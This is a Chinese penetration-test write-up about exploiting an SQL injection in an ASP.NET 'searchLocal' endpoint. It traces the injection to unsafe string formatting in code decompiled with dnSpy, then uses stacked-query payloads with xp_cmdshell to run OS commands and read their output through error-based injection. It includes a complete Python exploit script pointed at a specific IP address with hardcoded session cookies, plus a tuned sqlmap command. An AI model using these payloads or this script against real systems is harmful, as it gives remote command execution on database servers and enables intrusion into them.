> 原文链接: https://www.anquanke.com//post/id/237031 


# Mssql手工注入执行命令小记


                                阅读量   
                                **144831**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0119eeb8d3c5749b7d.jpg)](https://p2.ssl.qhimg.com/t0119eeb8d3c5749b7d.jpg)



## 前言

本次渗透通过某处SQL注入点进行源码分析，并手工利用xp_cmdshell进行了命令执行。



## 初现

在某个晴朗夏日午后，闲来无事想测试，这不，马上就掏出xray扫描到了一个sql注入漏洞，不得不说xray真的挺好用的。该项目方有提供源代码进行代码扫描，这正合我意，下面就来和我一起来跟踪下这个注入是怎么产生的吧。

[![](https://p4.ssl.qhimg.com/t01562439d06a56b5bf.png)](https://p4.ssl.qhimg.com/t01562439d06a56b5bf.png)



## 回溯

根据上图可以看出在app类searchLocal接口下的lat参数存在报错注入，项目使用asp.net开发，给予的项目核心源码为dll形式打包，下面使用Dnspy进行dll的反编译工作。

> [dnSpy](https://github.com/0xd4d/dnSpy/releases)是一款针对 .NET 程序的逆向工程工具。该项目包含了反编译器，调试器和汇编编辑器等功能组件，而且可以通过自己编写扩展插件的形式轻松实现扩展。该项目使用 dnlib读取和写入程序集，以便处理有混淆代码的程序（比如恶意程序）而不会崩溃。

点击文件-&gt;打开

[![](https://p5.ssl.qhimg.com/t01a70f0222baa32424.png)](https://p5.ssl.qhimg.com/t01a70f0222baa32424.png)

选中位于bin目录下的所有dll点击打开

[![](https://p0.ssl.qhimg.com/t0138c3a6ea1062c3b6.png)](https://p0.ssl.qhimg.com/t0138c3a6ea1062c3b6.png)

这时在程序右侧程序集资源管理器栏出现了反编译的源码，web.dll程序集中包含了Account类和App类的控制器。

[![](https://p3.ssl.qhimg.com/t01a2e87ad239205e7d.png)](https://p3.ssl.qhimg.com/t01a2e87ad239205e7d.png)

在app类控制器中找到了searchLocal方法，该方法直接通过url调用。可以看到在变量fieds中直接使用了`{`0`}``{`1`}`占位符拼接了sql语句，其后使用Request方式接收了lng和lat参数后使用Format格式化字符串将变量拼接到了指定占位符处，最后又进行了一次拼接直接执行sql语句导致了sql注入。

[![](https://p0.ssl.qhimg.com/t010b3d899be6b770cf.png)](https://p0.ssl.qhimg.com/t010b3d899be6b770cf.png)

本来打算使用使用sqlmap来跑的，但是在跑注入的时候发现由于该注入点比较特殊，而sqlmap的payload都有进行闭合注释操作

[![](https://p3.ssl.qhimg.com/t014801b6ea7ef99ac2.png)](https://p3.ssl.qhimg.com/t014801b6ea7ef99ac2.png)

当payload传入后端将会直接拼接带入sql语句，这样sql语句的执行就是完全错误的

[![](https://p2.ssl.qhimg.com/t0136ff137ff386370c.png)](https://p2.ssl.qhimg.com/t0136ff137ff386370c.png)

所以这里我先尝试手工进行sql注入利用xp_cmdshell执行命令。



## 命令执行

根据sql语句进行构造前缀闭合select查询进行堆叠注入

[![](https://p3.ssl.qhimg.com/t01eb76e8a0803087e2.png)](https://p3.ssl.qhimg.com/t01eb76e8a0803087e2.png)

payload前缀为`1))) as km FROM locations；`<br>
使用xp_cmdshell执行命令并查询回显，首先需要创建一个表，将执行的命令结果写入表中，再读取表的字段内容来获得回显。<br>
第一步创建一个表名为A_CMD用于存储执行的命令，payload为`2))) as km FROM locations;create TABLE A_CMD([Data][varchar](1000),ID int NOT NULL IDENTITY (1,1));--`，其中关键的语句为`create TABLE A_CMD([Data][varchar](1000),ID int NOT NULL IDENTITY (1,1))`，这句sql表示创建一个名为A_CMD的表并创建两个字段Data和ID，类型分别为varchar和int，ID非空并且自动增长。

[![](https://p1.ssl.qhimg.com/t0148419f806a134ca2.png)](https://p1.ssl.qhimg.com/t0148419f806a134ca2.png)

payload发送成功，我们来使用xp_cmdshell来执行命令并插入A_CMD表，payload为`2))) as km FROM locations;drop TABLE A_CMD;insert A_CMD exec master.dbo.xp_cmdshell 'whoami' ;--` 使用drop TABLE A_CMD语句在每次命令执行前将表清空来方便查询。

[![](https://p2.ssl.qhimg.com/t013840f855742e79b9.png)](https://p2.ssl.qhimg.com/t013840f855742e79b9.png)

接下来来查询表的行数，可以一行一行读取来获得全部回显。

```
convert(int,(select char(124)%2bcast(Count(1) as varchar(8000))%2bchar(124) From A_CMD))
```

返回的结果为4行

[![](https://p2.ssl.qhimg.com/t019fd711e7d038d90a.png)](https://p2.ssl.qhimg.com/t019fd711e7d038d90a.png)

未避免查询结果为int导致无报错回显，所以需要在查询结合中使用|字符串包含查询结果来进行报错，这里我们使用convert函数进行报错注入，所以无需闭合前面的select，查询执行结果`convert(int,(select Top 1 char(124)%2bdata%2bchar(124) From (select Top 1 [ID],[Data] From A_CMD Order by [ID]) T Order by [ID] desc))`，可以看到命令已经成功执行读取出了数据。

[![](https://p2.ssl.qhimg.com/t01f1d0720c21852f8b.png)](https://p2.ssl.qhimg.com/t01f1d0720c21852f8b.png)



## 编写脚本

下面考虑使用自动化脚本来实现命令执行，主要思路为：<br>
1.创建一个新表A_CMD并执行xp_cmdshell插入执行结果<br>
2.查询表列数，通过正则匹配列数。<br>
3.根据匹配到的列数遍历指定表，最后再使用正则将执行的结果获取出来。

```
import requests
import re

class SQLserverExec():
    def __init__(self):
        #通过该组合SQL语句创建一个新表A_CMD并执行xp_cmdshell插入执行结果
        self.exec_payload='2))) as km FROM locations;drop TABLE A_CMD; create TABLE A_CMD([Data][varchar](1000),ID int NOT NULL IDENTITY (1,1));insert A_CMD exec master.dbo.xp_cmdshell \'`{`0`}`\' ;--'
        #通过该组合SQL语句查询表列数
        self.exec_line_payload="convert(int,(select char(124)+cast(Count(1) as varchar(8000))+char(124) From A_CMD))"
        #通过该组合SQL语句根据列数遍历表查询内容
        self.select_data="convert(int,(select Top 1 char(124)+data+char(124) From (select Top `{`0`}` [ID],[Data] From A_CMD Order by [ID]) T Order by [ID] desc))"
        #设置cookie
        self.cookie=`{`'TY_SESSION_ID':'75c5187d-994f-41f1-b3ed-b77d66e25225','ASP.NET_SessionId':'yhxdx5qdfrrbqu52mbprt1pa'`}`
    def Getlines(self,command): #创建新表插入命令结果返回列数
        res=requests.post("http://39.100.85.166:8003/app/searchLocal/",data=`{`"lng":116.58,'lat':self.exec_payload.format(command)`}`,cookies=self.cookie)
        line_res=requests.post("http://39.100.85.166:8003/app/searchLocal/",data=`{`"lng":116.58,'lat':self.exec_line_payload`}`,cookies=self.cookie)
        line=int(re.search('\|([\s\S]*?)\|',line_res.text).group(1))
        return line
    def ExecCommand(self,command): #跟据列数循环读取内容
        result =''
        for b in range(0,self.Getlines(command)):
            res=requests.post("http://39.100.85.166:8003/app/searchLocal/",data=`{`"lng":116.58,'lat':self.select_data.format(b+1)`}`,cookies=self.cookie)
            data=re.search('&lt;!--[\s\S]*?\|([\s\S]*?)\|',res.text)
            if data is not None:
                result += data.group(1)+'\n' #对获取到的每行内容输出时做格式化换行处理方便阅读
        return result

A=SQLserverExec()
print(A.ExecCommand('ipconfig'))
```

[![](https://p3.ssl.qhimg.com/t01b27a7b86afd39745.png)](https://p3.ssl.qhimg.com/t01b27a7b86afd39745.png)

可以看到命令成功执行



## 使用SQLmap自动化注入

由于注入点的特殊性，所以我们需要构造一个sqlmap的标准注入环境，在闭合select查询后我们可以再构造一个条件，来实现模拟条件注入。最终payload

```
2))) as km FROM locations where id=1
```

使用—prefix参数来添加注入前缀，这样sqlmap的payload就可以以普通的条件查询来进行注入了。

```
sqlmap.py -u "http://xxx.xx/app/searchLocal/" -p "lat" --random-agent --data="lng=116.58&amp;lat=2" --dbms=mssqlserver --cookie="TY_SESSION_ID=75c5187d-994f-41f1-b3ed-b77d66e25225; ASP.NET_SessionId=yhxdx5qdfrrbqu52mbprt1pa" --prefix="2))) as km FROM locations where id=1" --dbs
```

[![](https://p4.ssl.qhimg.com/t016473ce2cb798800d.png)](https://p4.ssl.qhimg.com/t016473ce2cb798800d.png)



## 后记

本次渗透其实经过了很多的试错最后才达到了这个结果，所以说看似简单的渗透过程其中可能包含了各种各样的难点痛点，而这些难点痛点介于篇幅等其他原因不能一一列举出来，重要的不是结果，而是这个试错的过程，只有不断地试错才能不断的成长。
